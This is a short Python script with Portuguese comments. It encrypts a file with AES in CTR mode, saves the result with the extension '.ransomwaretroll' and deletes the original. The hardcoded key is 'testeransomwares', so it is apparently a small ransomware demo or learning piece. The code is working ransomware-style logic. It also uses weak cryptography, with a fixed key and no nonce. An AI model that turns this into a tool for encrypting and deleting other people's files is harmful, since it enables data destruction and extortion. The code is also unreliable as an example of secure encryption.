import os
import pyaes

def encrypt_file(original_file_path, encrypted_file_path, key):
    """
    Criptografa um arquivo usando AES no modo CTR.
    
    Args:
        original_file_path (str): Caminho para o arquivo original a ser criptografado.
        encrypted_file_path (str): Caminho para salvar o arquivo criptografado.
        key (bytes): Chave de criptografia (deve ter 16, 24 ou 32 bytes para AES).
    
    Raises:
        FileNotFoundError: Se o arquivo original não existir.
        ValueError: Se a chave for inválida.
        Exception: Para outros erros durante a criptografia.
    """
    # Verificar se o arquivo original existe
    if not os.path.exists(original_file_path):
        raise FileNotFoundError(f"Arquivo original não encontrado: {original_file_path}")
    
    # Verificar se a chave tem o tamanho correto (AES suporta 128, 192 ou 256 bits)
    if len(key) not in [16, 24, 32]:
        raise ValueError("A chave deve ter 16, 24 ou 32 bytes.")
    
    try:
        # Abrir e ler o arquivo original
        with open(original_file_path, "rb") as file:
            file_data = file.read()
        
        # Configurar AES no modo CTR e criptografar
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)
        
        # Criar o arquivo criptografado
        with open(encrypted_file_path, "wb") as new_file:
            new_file.write(crypto_data)
        
        # Remover o arquivo original apenas após sucesso
        os.remove(original_file_path)
        print(f"Arquivo criptografado com sucesso: {encrypted_file_path}")
    
    except Exception as e:
        print(f"Erro durante a criptografia: {e}")
        raise

# Exemplo de uso (pode ser adaptado para argumentos de linha de comando ou inputs)
if __name__ == "__main__":
    original_file = "teste.txt"
    encrypted_file = "teste.txt.ransomwaretroll"
    key = b"testeransomwares"  # A chave deve ser a mesma usada na descriptografia
    
    encrypt_file(original_file, encrypted_file, key)
